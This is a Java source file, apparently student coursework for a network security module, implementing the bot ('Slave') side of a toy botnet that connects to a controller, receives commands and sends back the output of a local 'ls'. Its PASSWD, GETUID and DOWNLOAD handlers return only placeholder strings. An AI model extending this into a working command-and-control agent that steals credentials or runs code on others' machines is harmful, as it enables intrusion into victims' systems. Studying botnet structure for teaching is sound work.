/*
AUTHOR: Daniel Hedemalm
Module: Network Security & Cryptography CSN09112
*/

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;
import java.util.ArrayList;
import java.util.List;

public class Slave
{

  Socket sock;
  String ip_addr;
  int port;
  PrintWriter out;
  BufferedReader in;

  Slave(String ipaddress, int targetPort)
  {
      ip_addr = ipaddress;
      port = targetPort;
  }

  public static void main(String[] args) throws IOException, InterruptedException {
    // Default target is localhost
    System.out.println("-------------------------------");
    System.out.println("| Flowless' Botnet --- Slave  |");
    System.out.println("|         Version 1.0         |");
    System.out.println("-------------------------------");
    String ip = "127.0.0.1";
    int port = 8888;
    // If anything else given, assign that IP address instead
    if (args.length > 0){
        ip = args[0];
    }
    // If two arguments are given, port will be second one
    if (args.length > 1) {
      port = Integer.parseInt(args[1]);
    }
    // Instantiate the sender
    Slave sender = new Slave(ip, port);
    // Connection made
    if (!sender.Connect()) {
      return;
    }

    while (true) {
      // Read and action
      sender.Read();
      // Sleep to avoid spam
      int sleepTime = 3000; //milliseconds
      //Thread.sleep(sleepTime);
    }
  }

  boolean Connect() throws IOException
  {
    try {
        System.out.println("Connecting to "+ip_addr+":"+port);
        sock = new Socket(ip_addr, port);
    }
    catch (java.net.ConnectException e)
    {
        System.out.println(e.toString());
        return false;
    }
    catch (IOException e)
    {
        return false;
    }
    System.out.println("Connected!");
    // Instantiates send and receive stream
    out = new PrintWriter(sock.getOutputStream(), true);
    in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
    return true;
  }

  void Read() throws IOException
  {
    if (!in.ready()) {
      return;
    }
    // Reads commands from Controller
    String command = null;
    do {
      command = in.readLine();
      System.out.println("Received: "+ command);
    } while (command == null);
    // use method action();
    action(command);
  }

  void action(String command) throws IOException {
    if (command.equals("VERSION")) {
      Reply(executeCommand("ls"));
    }
    else if (command.equals("PASSWD")) {
      Reply("<passwd>");
    }
    else if (command.equals("GETUID")) {
      Reply("<UID>");
    }
    else if (command.equals("DOWNLOAD")) {
      Reply("<DL'd>");
    }
    else {
      System.out.println("Invalid command received.");
    }
  }

  void Reply(String output) throws IOException {
    out.println(output);
    out.flush();
  }

  public String executeCommand(String command) {

    StringBuffer output = new StringBuffer();

    Process p;
    try {
      p = Runtime.getRuntime().exec(command);
      p.waitFor();
      BufferedReader reader =
                      new BufferedReader(new InputStreamReader(p.getInputStream()));

      String line = "";
      while ((line = reader.readLine())!= null) {
          output.append(line + " | ");
      }

    } catch (Exception e) {
        e.printStackTrace();
    }

    return output.toString();

  }

}
